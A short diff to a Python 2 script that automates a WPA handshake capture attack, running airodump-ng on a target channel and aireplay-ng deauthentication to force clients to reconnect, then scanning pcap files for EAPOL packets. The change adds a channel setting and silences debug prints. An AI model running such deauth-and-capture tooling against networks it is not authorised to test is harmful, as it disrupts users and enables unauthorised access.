@@ -304,6 +304,7 @@ if __name__ == '__main__':
 						'client_MAC':(f_xml.client_list),	#expects a list
 						'conn':deauth_child_conn})
 #start airodump-ng process - focussed this time. Captures any 4 way hadnshakes.
+						f_scanner.set_channel(f_xml.channel)
 						f_airodump.start()
 #start aireplay-ng process with deauth method. Deauths clients to force handshaking procedure.
 						f_deauth.start()
@@ -320,8 +321,8 @@ if __name__ == '__main__':
 							time.sleep(8)
 							if deauth == True:
 								files_handshake = os.listdir(handshake_dir)
-								print colored("DEBUG: files in HS folder:", 'red')   #debug
-								print colored(files_handshake, 'red')                #debug
+								#print colored("DEBUG: files in HS folder:", 'red')   #debug
+								#print colored(files_handshake, 'red')                #debug
 								for files in files_handshake:		
 #scan pcap file for valid handshake EAPOL packets
 									handshake_file = (handshake_dir+files)
